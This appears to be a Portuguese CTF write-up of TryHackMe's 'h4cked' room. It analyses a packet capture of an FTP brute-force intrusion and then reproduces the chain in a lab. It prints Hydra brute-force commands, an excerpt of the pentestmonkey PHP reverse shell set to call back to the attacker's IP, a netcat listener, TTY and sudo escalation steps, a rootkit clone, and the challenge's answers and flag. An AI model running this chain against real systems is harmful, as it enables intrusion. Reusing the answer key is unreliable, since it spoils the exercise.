# 🕵️ h4cked — CTF Writeup
### TryHackMe | Forense de Rede (Wireshark) + Reprodução Prática | FTP Brute Force · PHP Backdoor · Reptile Rootkit

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                            |
| **Data do Relatório** | 17/08/2026                                                                             |
| **Data do Pentest**   | 17/08/2026 · 21:36 – 21:39 (GMT+0000, reprodução prática) · Captura histórica (`h4cked.pcapng`) |
| **Alvo (forense)**    | `192.168.0.115` (host `wir3`) — atacante `192.168.0.147`                               |
| **Alvo (prática)**    | `10.66.131.181` — TryHackMe · h4cked (Task 2 — "Hack your way back into the machine")  |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Wireshark · Hydra 9.7 · FTP (cliente) · Netcat · Python3 (`pty.spawn`) · Reptile (LKM Rootkit) |
| **Plataforma**        | TryHackMe — Forense de Rede + Boot-to-Root                                             |

---

## 🔍 Resumo Executivo

Este relatório documenta a resolução completa do desafio **h4cked** (TryHackMe), dividido em duas partes complementares. Na **primeira parte**, foi realizada uma **análise forense de tráfego de rede** a partir de um arquivo de captura (`h4cked.pcapng`) fornecido pela organização fictícia, reconstruindo passo a passo um incidente de segurança real: um ataque de **força bruta contra um serviço FTP** (via **Hydra**), a obtenção de credenciais válidas (`jenny:password123`), o **upload de um backdoor PHP** (`shell.php`, baseado no clássico *php-reverse-shell* de pentestmonkey), a obtenção de uma shell reversa, o levantamento de informações do host comprometido (`wir3`), a estabilização da sessão via TTY interativa em Python, a **escalada de privilégios** para `root` via `sudo su`, e a instalação do **Reptile**, um **rootkit de kernel Linux** projetado para persistência e ocultação. Na **segunda parte** ("Hack your way back into the machine"), a mesma cadeia de ataque foi **reproduzida na prática** contra uma instância viva (`10.66.131.181`), replicando o ataque de força bruta com Hydra, o upload do backdoor via FTP, a obtenção da shell reversa, a escalada de privilégios e a captura da flag final diretamente no diretório clonado do repositório **Reptile**.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Wireshark**                   | -       | Análise forense do arquivo de captura `h4cked.pcapng` (filtro `ftp`, Follow TCP Stream)  |
| **Hydra**                       | 9.7     | Ataque de força bruta contra o serviço FTP (identificado na análise e reproduzido na prática) |
| **Cliente FTP**                 | -       | Upload manual do backdoor `shell.php` durante a reprodução prática                       |
| **Netcat**                      | -       | Listener para captura da reverse shell (`nc -lnvp 4444`)                                |
| **Python3 (`pty.spawn`)**       | -       | Estabilização da shell reversa em uma TTY interativa completa                           |
| **Reptile**                     | -       | Rootkit de kernel Linux (LKM) identificado como backdoor de persistência instalado pelo atacante |

---

## 📋 PARTE 1 — Análise Forense do Ataque (h4cked.pcapng)

### FASE 1 — Identificação do Serviço Comprometido

A análise do arquivo `h4cked.pcapng` no Wireshark, com o filtro `ftp`, revelou desde o primeiro pacote que **todo o tráfego malicioso ocorreu sobre o protocolo FTP** (porta 21), evidenciado pela coluna **Protocol: FTP** consistente em centenas de pacotes capturados entre o atacante (`192.168.0.147`) e a vítima (`192.168.0.115`).

[FTP](/CTFs/h4cked/images/Service_Hacked(1).png)
> ✅ **Serviço comprometido: FTP**

---

### FASE 2 — Identificação da Ferramenta de Força Bruta

O padrão de tráfego observado — dezenas de tentativas de login sequenciais e automatizadas, todas retornando `530 Login incorrect`, em um intervalo de poucos milissegundos entre cada tentativa — é a assinatura clássica de uma ferramenta de força bruta automatizada. Uma pesquisa pelo autor de ferramentas populares de brute force (**Van Hauser**) confirmou a ferramenta utilizada:

```
Van Hauser tool for brute force

"The tool developed by Van Hauser for brute-forcing network services is
THC-Hydra (often referred to simply as Hydra). Written in C, it is a
high-performance, parallelized login cracker designed to guess valid
username and password pairs across a wide variety of protocols."
```
[Hydra](/CTFs/h4cked/images/Brute_Force_Tool(2).png)
> ✅ **Ferramenta de força bruta: Hydra**

---

### FASE 3 — Usuário-Alvo da Força Bruta

No filtro `ftp` do Wireshark, múltiplos pacotes `Request: USER jenny` foram observados repetidamente, indicando que o atacante manteve o **mesmo nome de usuário fixo** (`jenny`) enquanto variava a senha a cada tentativa — o comportamento característico de um ataque de força bruta de senha (e não de usuário):

```
No.  Time         Source           Destination      Protocol  Info
81   0.354319120  192.168.0.147    192.168.0.115    FTP       Request: USER jenny
82   0.354470850  192.168.0.147    192.168.0.115    FTP       Request: USER jenny
83   0.354473399  192.168.0.147    192.168.0.115    FTP       Request: USER jenny
...
```
[Jenny](/CTFs/h4cked/images/The_Username_Brute_Force(3).png)
> ✅ **Usuário-alvo: `jenny`**

---

### FASE 4 — Senha Comprometida

Seguindo os pacotes `PASS`, uma sequência de senhas comuns foi testada (`internet`, `password123`, `1qaz2wsx`, `monkey`, `michael`, `shadow`, `666666`, `letmein`, `jessica`, `iloveyou`, `daniel`...) até que o pacote correspondente à senha **`password123`** retornou a resposta de sucesso do servidor:

```
No.  Time          Source          Destination     Protocol  Info
394  13.968715114  192.168.0.147   192.168.0.115   FTP       Request: PASS password123
395  14.002582310  192.168.0.115   192.168.0.147   FTP       Response: 230 Login successful.
```
[Pass](/CTFs/h4cked/images/Password_User(4).png)
> ✅ **Credencial comprometida: `jenny : password123`**

---

### FASE 5 — Diretório de Login

Imediatamente após a autenticação, o atacante emitiu o comando `PWD` para confirmar o diretório de trabalho atual no servidor FTP comprometido:

```
No.  Time          Source          Destination     Protocol  Info
400  15.576739978  192.168.0.147   192.168.0.115   FTP       Request: PWD
401  15.577170346  192.168.0.115   192.168.0.147   FTP       Response: 257 "/var/www/html" is the current directory
```
[Directory](/CTFs/h4cked/images/Directory_of_Login(5).png)
> ✅ **Diretório de trabalho após login: `/var/www/html`** — um caminho estrategicamente valioso, pois corresponde à raiz web do servidor, permitindo que qualquer arquivo enviado seja imediatamente acessível via HTTP.

---

### FASE 6 — Upload do Backdoor

Com acesso de escrita confirmado no diretório raiz do site, o atacante enviou um arquivo PHP malicioso via o comando `STOR`, seguido da alteração de suas permissões para garantir execução:

```
No.  Time          Source          Destination     Protocol  Info
425  19.323635348  192.168.0.147   192.168.0.115   FTP       Request: STOR shell.php
429  19.324742316  192.168.0.115   192.168.0.147   FTP       Response: 150 Ok to send data.
436  19.325877349  192.168.0.115   192.168.0.147   FTP       Response: 226 Transfer complete.
438  22.682708871  192.168.0.147   192.168.0.115   FTP       Request: SITE CHMOD 777 shell.php
439  22.683282161  192.168.0.115   192.168.0.147   FTP       Response: 200 SITE CHMOD command ok.
```

[Backdoor](/CTFs/h4cked/images/Backdoor_Upload(6).png)
> ✅ **Backdoor enviado: `shell.php`**, com permissões alteradas para `777` (leitura, escrita e execução por qualquer usuário) — garantindo que o servidor web (Apache/PHP) pudesse executá-lo ao ser acessado via navegador.

---

### FASE 7 — Origem do Backdoor

Utilizando a função **Follow TCP Stream** do Wireshark no fluxo correspondente ao upload (`STOR shell.php`), o conteúdo completo do arquivo enviado foi reconstruído, revelando tratar-se do clássico **php-reverse-shell** de pentestmonkey, incluindo o cabeçalho de licença e a URL de referência do projeto original:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
...
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.147';   // CHANGE THIS
$port = 80;               // CHANGE THIS
...
$shell = 'uname -a; w; id; /bin/sh -i';
```

[Backdoor Template](/CTFs/h4cked/images/Backdoor_URL(7).png)
> ✅ **URL de origem do backdoor: `http://pentestmonkey.net/tools/php-reverse-shell`**

---

### FASE 8 — Comando Executado Após Obter a Shell

Ao seguir o fluxo TCP correspondente à conexão reversa recebida pelo atacante (após o acesso ao `shell.php` disparar o payload), o primeiro comando manualmente digitado pelo atacante foi:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

[whoami](/CTFs/h4cked/images/Command_Run_After_Obtain_Shell(8).png)
> ✅ **Primeiro comando executado manualmente: `whoami`** — confirmando o contexto de execução como o usuário de serviço do servidor web (`www-data`).

---

### FASE 9 — Nome do Host Comprometido

O prompt da shell obtida revelou diretamente o hostname da máquina vítima:

```
www-data@wir3:/$
```

[Host](/CTFs/h4cked/images/Name_of_PC(9).png)
> ✅ **Hostname do computador comprometido: `wir3`**

---

### FASE 10 — Estabilização da Shell: TTY Interativa

Com uma shell não-interativa em mãos (`sh`), o atacante utilizou a técnica padrão de spawn de PTY via Python para obter uma shell interativa completa, essencial para executar comandos como `su` e `sudo` que exigem um terminal real:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

[Shell TTY](/CTFs/h4cked/images/Command_to_TTY_Shell(10).png)
> ✅ **Comando para obter uma TTY interativa: `python3 -c 'import pty; pty.spawn("/bin/bash")'`**

---

### FASE 11 — Comando de Escalada de Privilégios

Após estabilizar a shell, o atacante trocou de usuário para `jenny` (usando a senha já comprometida na força bruta) e, então, verificou e explorou uma permissão de `sudo` irrestrita:

```bash
su jenny
Password: password123

jenny@wir3:/$ sudo -l
Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL

jenny@wir3:/$ sudo su
root@wir3:/#
```

[Privesc](/CTFs/h4cked/images/Command_to_Privesc(11).png)
> ✅ **Comando executado para obter uma shell root: `sudo su`** — possível pois `jenny` possuía permissão irrestrita `(ALL : ALL) ALL` no `sudoers`.

---

### FASE 12 — Download do Projeto do GitHub: Persistência

Já com privilégios de `root`, o atacante navegou até o diretório pessoal e clonou um repositório público do GitHub, visando estabelecer persistência furtiva no sistema:

```bash
root@wir3:~# git clone https://github.com/f0rb1dd3n/Reptile.git
```

[Reptile](/CTFs/h4cked/images/Name_of_Project_Github(12).png)
> ✅ **Nome do projeto do GitHub: `Reptile`**

---

### FASE 13 — Classificação do Backdoor

A investigação do repositório `f0rb1dd3n/Reptile` no GitHub confirmou a natureza exata da ferramenta baixada:

```
Reptile

⚠️ Security Research and Dual-Use Warning

Reptile is a Linux kernel rootkit with capabilities including privilege
escalation, persistence, concealment, and remote command execution...

Features:
  • Give root to unprivileged users
  • Hide files and directories
  • Hide processes
  • Hide himself
  • Hide TCP/UDP connections
  • Hidden boot persistence
  • File content tampering
  • Some obfuscation techniques
```

[Backdoor Style](/CTFs/h4cked/images/Style_of_Backdoor(13).png)
> ✅ **Tipo de backdoor: `rootkit`** — mais especificamente, um **LKM (Loadable Kernel Module) rootkit**, uma das formas mais furtivas e persistentes de comprometimento, capaz de ocultar processos, arquivos, conexões de rede e a si mesmo do sistema operacional comprometido.

---

## 📋 PARTE 2 — Reprodução Prática do Ataque ("Hack your way back into the machine")

Com a cadeia de ataque completamente mapeada através da análise forense, a Task 2 do desafio propôs **reproduzir o mesmo ataque na prática**, contra uma instância viva em `10.66.131.181`.

### FASE 14 — Reprodução: Força Bruta, Upload do Backdoor, Shell Reversa e Escalada de Privilégios

**Força bruta contra o serviço FTP com Hydra:**

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.66.131.181
```

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-17 21:36:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)
[DATA] attacking ftp://10.66.131.181:21/
[21][ftp] host: 10.66.131.181   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-17 21:37:22
```

> 🚨 **Credencial obtida na instância viva: `jenny : 987654321`**

**Upload do backdoor via FTP:**

```bash
ftp 10.66.131.181
Name (10.66.131.181:nistezy): jenny
Password: [987654321]
230 Login successful.

ftp> put shell.php
local: shell.php remote: shell.php
226 Transfer complete.
5496 bytes sent in 00:00 (15.12 KiB/s)

ftp> site chmod 755 shell.php
200 SITE CHMOD command ok.

ftp> ls -l shell.php
-rwxr-xr-x   1 1000     1000         5496 Aug 17 21:39 shell.php
```

**Captura da reverse shell:**

```bash
nc -lnvp 4444
```

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.66.131.181] 42788
Linux ip-10-66-131-181 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Escalada de privilégios (reprodução dos comandos identificados na análise forense):**

```bash
su jenny
Password: 987654321

python3 -c 'import pty; pty.spawn("/bin/bash")'

jenny@ip-10-66-131-181:/$ sudo su
[sudo] password for jenny: 987654321
root@ip-10-66-131-181:/#
```

[Pentest](/CTFs/h4cked/images/Brute_Force_if_Hydra_and_Upload_Shell(14).png)
> 🚩 **Escalada de privilégios bem-sucedida — shell root obtida na instância viva**

---

### FASE 15 — Captura da Flag

Com acesso `root` confirmado, o diretório pessoal e o repositório clonado do **Reptile** foram localizados, revelando a flag do desafio:

```bash
cd /root
ls
# Reptile  snap

cd Reptile
ls
# configs  Kconfig  Makefile  README.md  userland  flag.txt  kernel  output  scripts

cat flag.txt
```

```
ebcefd66ca4b559d17b440b6e67fd0fd
```

[Privesc - Root Flag](/CTFs/h4cked/images/Reverse_Shell-_Privesc-_Flag.png)
> 🚩 **flag.txt — FLAG FINAL CAPTURADA: `ebcefd66ca4b559d17b440b6e67fd0fd`**

---

## ⛓ Linha do Tempo do Comprometimento (Análise Forense)

```
[FASE 1] SERVIÇO COMPROMETIDO
    Tráfego 100% FTP (porta 21) entre 192.168.0.147 (atacante) e 192.168.0.115 (vítima)
    ↓
[FASE 2] FERRAMENTA DE FORÇA BRUTA
    Padrão de tentativas automatizadas → Hydra (THC-Hydra / Van Hauser)
    ↓
[FASE 3] USUÁRIO-ALVO
    Múltiplos "USER jenny" com senha variável
    ↓
[FASE 4] CREDENCIAL COMPROMETIDA
    PASS password123 → 230 Login successful
    ↓
[FASE 5] DIRETÓRIO DE LOGIN
    PWD → "/var/www/html" (raiz web do servidor)
    ↓
[FASE 6] UPLOAD DO BACKDOOR
    STOR shell.php + SITE CHMOD 777 shell.php
    ↓
[FASE 7] ORIGEM DO BACKDOOR
    php-reverse-shell (pentestmonkey.net)
    ↓
[FASE 8] PRIMEIRO COMANDO NA SHELL
    whoami → www-data
    ↓
[FASE 9] HOSTNAME IDENTIFICADO
    wir3
    ↓
[FASE 10] ESTABILIZAÇÃO DA SHELL
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ↓
[FASE 11] ESCALADA DE PRIVILÉGIOS
    su jenny → sudo su → root@wir3
    ↓
[FASE 12] PERSISTÊNCIA
    git clone https://github.com/f0rb1dd3n/Reptile.git
    ↓
[FASE 13] CLASSIFICAÇÃO DO BACKDOOR
    Reptile = Rootkit de kernel Linux (LKM)
    ↓
ANÁLISE FORENSE CONCLUÍDA — cadeia de ataque totalmente reconstruída
    ↓
[21:36-21:39 GMT] FASE 14-15 — REPRODUÇÃO PRÁTICA (Task 2)
    Hydra → jenny:987654321 → upload shell.php → reverse shell → sudo su → root
    FLAG: ebcefd66ca4b559d17b440b6e67fd0fd ✓
    ↓
DESAFIO CONCLUÍDO — incidente reconstruído e reproduzido com sucesso
```

---

## 🗺 Mapeamento Investigativo

| # | Pergunta do Desafio | Resposta | Evidência (Wireshark/Ferramenta) |
|---|----------------------|----------|-----------------------------------|
| 1 | Qual serviço foi atacado? | **FTP** | Coluna Protocol consistente em todos os pacotes |
| 2 | Ferramenta de força bruta (Van Hauser)? | **Hydra** | Padrão de tentativas automatizadas + pesquisa |
| 3 | Usuário-alvo da força bruta? | **jenny** | Pacotes `USER jenny` repetidos |
| 4 | Senha do usuário? | **password123** | Pacote `PASS password123` → `230 Login successful` |
| 5 | Diretório FTP após login? | **/var/www/html** | Resposta `257 "/var/www/html" is the current directory` |
| 6 | Nome do arquivo de backdoor enviado? | **shell.php** | Pacote `STOR shell.php` |
| 7 | URL completa de origem do backdoor? | **http://pentestmonkey.net/tools/php-reverse-shell** | Follow TCP Stream do upload |
| 8 | Comando executado após obter a shell? | **whoami** | Follow TCP Stream da conexão reversa |
| 9 | Hostname do computador? | **wir3** | Prompt da shell: `www-data@wir3:/$` |
| 10 | Comando para spawn de TTY? | **python3 -c 'import pty; pty.spawn("/bin/bash")'** | Follow TCP Stream |
| 11 | Comando para obter shell root? | **sudo su** | Follow TCP Stream — `jenny` com `sudo` irrestrito |
| 12 | Nome do projeto no GitHub baixado? | **Reptile** | `git clone https://github.com/f0rb1dd3n/Reptile.git` |
| 13 | Tipo de backdoor instalado? | **rootkit** | README do repositório Reptile (LKM rootkit) |
| 14 | Reprodução prática (Task 2) | **Concluída com sucesso** | Hydra + FTP + Netcat + escalada + flag capturada |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Arquivo de evidência | `h4cked.pcapng` | Captura de tráfego do incidente histórico analisado |
| Atacante (histórico) | `192.168.0.147` | Origem da força bruta e upload do backdoor |
| Vítima (histórico) | `192.168.0.115` (hostname `wir3`) | Host comprometido no incidente original |
| Alvo (reprodução prática) | `10.66.131.181` | Instância viva utilizada na Task 2 |
| Serviço comprometido | FTP (porta 21) | Vetor de acesso inicial em ambos os cenários |
| Credencial (histórico) | `jenny : password123` | Obtida por força bruta com Hydra |
| Credencial (reprodução) | `jenny : 987654321` | Obtida por força bruta com Hydra (instância diferente) |
| Backdoor enviado | `shell.php` | php-reverse-shell (pentestmonkey), enviado via `STOR` |
| Origem do backdoor | `http://pentestmonkey.net/tools/php-reverse-shell` | Referenciada no cabeçalho do próprio arquivo |
| Ferramenta de persistência | **Reptile** (`f0rb1dd3n/Reptile`) | Rootkit de kernel Linux (LKM) |
| Flag | `ebcefd66ca4b559d17b440b6e67fd0fd` | `/root/Reptile/flag.txt` (reprodução prática) |
| Técnica (MITRE ATT&CK) | `T1110.001` | Brute Force: Password Guessing (FTP via Hydra) |
| Técnica (MITRE ATT&CK) | `T1105` | Ingress Tool Transfer (upload do backdoor via FTP) |
| Técnica (MITRE ATT&CK) | `T1505.003` | Server Software Component: Web Shell |
| Técnica (MITRE ATT&CK) | `T1548.003` | Abuse Elevation Control Mechanism: Sudo and Sudo Caching |
| Técnica (MITRE ATT&CK) | `T1014` | Rootkit (Reptile) |
| Técnica (MITRE ATT&CK) | `T1608.001` | Stage Capabilities: Upload Malware (clone do repositório) |

---

## ✅ Resumo da Flag

| # | Flag | Valor | Origem |
|---|------|-------|--------|
| 🚩 Flag | `flag.txt` | `ebcefd66ca4b559d17b440b6e67fd0fd` | `/root/Reptile/flag.txt` (Task 2 — reprodução prática) |

---


## 📚 Referências

- [TryHackMe — h4cked](https://tryhackme.com/room/h4cked)
- [Wireshark — Follow TCP Stream Documentation](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)
- [pentestmonkey — PHP Reverse Shell](http://pentestmonkey.net/tools/php-reverse-shell)
- [GitHub — vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- [GitHub — f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile)
- [MITRE ATT&CK T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK T1505.003 — Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE ATT&CK T1548.003 — Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)
- [MITRE ATT&CK T1014 — Rootkit](https://attack.mitre.org/techniques/T1014/)

---